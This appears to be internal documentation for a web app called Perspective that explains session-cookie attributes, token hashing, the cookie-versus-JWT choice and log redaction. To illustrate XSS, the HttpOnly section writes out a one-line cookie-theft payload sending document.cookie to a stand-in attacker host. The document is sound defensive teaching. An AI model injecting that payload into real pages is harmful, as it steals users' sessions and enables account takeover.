# Cookie Security, From First Principles

## What a cookie is

HTTP is stateless: each request is independent, and the server doesn't remember you. A **cookie** is a small named value the **server** asks the browser to store:

```
Set-Cookie: session=Zk3...q9A; Path=/; Expires=Thu, 25 Dec 2026 10:00:00 GMT; HttpOnly; Secure; SameSite=Lax
```

From then on, the **browser automatically attaches it** to every request to that site:

```
Cookie: session=Zk3...q9A
```

No JavaScript is involved: the browser does it. That's both the strength of cookies (nothing to forget, nothing for scripts to touch) and their danger (they're also sent on requests _you_ didn't intend; see CSRF below).

Perspective's session cookie is set by `setSessionCookie` → `cookieOptions(expires)` in `apps/api/src/modules/auth/sessions.ts:115`:

```ts
{ httpOnly: true, secure: env.NODE_ENV === "production", sameSite: "lax", path: "/", expires }
```

## Each attribute, and what would happen without it

### `HttpOnly`

**Meaning:** page JavaScript can't read the cookie: `document.cookie` doesn't show it, and no script can send it anywhere.
**Why:** if an attacker ever manages to run JavaScript on the page (XSS), the first thing they'd do is `fetch("https://evil.example?c=" + document.cookie)` and use the session from their own machine for weeks.
**Without it:** any XSS bug becomes a full account takeover that survives after the victim closes the tab. With it, XSS is still bad (the script can act _while the page is open_), but it can't exfiltrate the session.

### `Secure`

**Meaning:** only sent over HTTPS.
**Why:** on plain HTTP (public Wi-Fi), anyone on the network can read every header.
**In Perspective:** on in production; off in development because `http://localhost` has no TLS (`secure: env.NODE_ENV === "production"`).
**Without it in production:** a single accidental `http://` request would leak the session.

### `SameSite=Lax`

**Meaning:** the browser sends the cookie on requests _from our own site_, and on top-level navigations (clicking a link) from other sites, but **not** on cross-site sub-requests such as a form `POST`, a `fetch`, or an `<img>` from another site.

| Request made from `evil.example` to our site     | `Strict` | `Lax` (ours) | `None`     |
| ------------------------------------------------ | -------- | ------------ | ---------- |
| User clicks a normal link to us (GET navigation) | ❌       | ✅           | ✅         |
| Hidden form auto-submits a POST to us            | ❌       | ❌           | ✅ (CSRF!) |
| `fetch()` / `<img>` / `<iframe>` to us           | ❌       | ❌           | ✅         |

**Why Lax, not Strict:** with Strict, arriving from a link in an email or search result would appear logged out on the first page. Lax keeps that working while blocking cross-site writes.
**Without it (`None`):** another site could make your browser POST to `/api/posts/x/vote` _with your cookie_: CSRF. (`None` also requires `Secure`.)

### `Path=/`

The cookie is sent for every path, including `/api/...`.

### `Expires`

30 days from issue, extended while you're active. Without an expiry it would be a "session cookie" deleted when the browser closes. Perspective wants "stay logged in".

### No `Domain` attribute

Omitting `Domain` makes it a **host-only** cookie: sent only to exactly `perspective-lilac.vercel.app`, not to subdomains. That's the safest choice.

## Why the cookie is sent to the API at all

The browser only sends a site's cookies to that site. The API lives on Render (`*.onrender.com`), a different site. Perspective solves this by never calling Render directly: the browser calls `https://perspective-lilac.vercel.app/api/...`, and Vercel forwards the request, cookie header included. From the browser's point of view it's one site, so the cookie is first-party (D33).

## What the cookie contains, and what the database stores

- The cookie value is 32 random bytes, base64url-encoded: 43 characters. It's a **reference**, not data: it contains no user id, role or expiry.
- The database stores `sha256(value)`. Every request hashes the cookie and looks up the hash.

**Why hash it:** if someone copied the `sessions` table (a backup leak, or an injection that reads it), they'd have hashes, which can't be turned back into the 256-bit random tokens.

## Cookies vs localStorage + JWT (D12)

| Question                              | httpOnly session cookie (Perspective) | JWT in localStorage                                 |
| ------------------------------------- | ------------------------------------- | --------------------------------------------------- |
| Can injected JavaScript steal it?     | No                                    | Yes: `localStorage.getItem(...)`                    |
| Sent automatically?                   | Yes, so CSRF defence is needed        | No, so the app must add a header (no CSRF)          |
| Can the server revoke it instantly?   | Yes (delete the row)                  | No, not until it expires, unless you add a denylist |
| Does a role change apply immediately? | Yes (user read per request)           | No (role baked into the token)                      |
| Server state needed?                  | One row per session                   | None (stateless), until you need revocation         |

Perspective picks the cookie: XSS theft and slow revocation are the more serious problems for an account system with bans and moderators, and CSRF is fully handled by SameSite + Origin + JSON (see [CSRF_CORS_AND_XSS.md](CSRF_CORS_AND_XSS.md)).

## Other cookies

| Cookie           | Purpose                                    | Lifetime | Same options |
| ---------------- | ------------------------------------------ | -------- | ------------ |
| `google_oauth`   | state, PKCE verifier, nonce, intent (JSON) | 10 min   | yes          |
| `google_pending` | random token → `oauth_pending` row         | 15 min   | yes          |

Both are set with the same `cookieOptions`, so they're httpOnly, Secure in production and Lax. **Why Lax matters for Google:** the callback is a top-level GET navigation coming _from_ Google (a cross-site link), and Lax cookies are sent on those, so the state cookie arrives. With `Strict` the callback would never see it.

## Rotation and clearing

- **On login** a new session is always created and the previous one deleted, which defeats _session fixation_ (an attacker planting a known token in your browser before you log in).
- **Invalid, expired or banned** sessions are deleted, and the cookie is cleared with `clearCookie("session", { path: "/" })`.
- **Renewal** re-sends the same token with a later expiry.

## Logging

Pino's redact list includes `req.headers.cookie` and `res.headers["set-cookie"]`, so cookies never reach the logs.
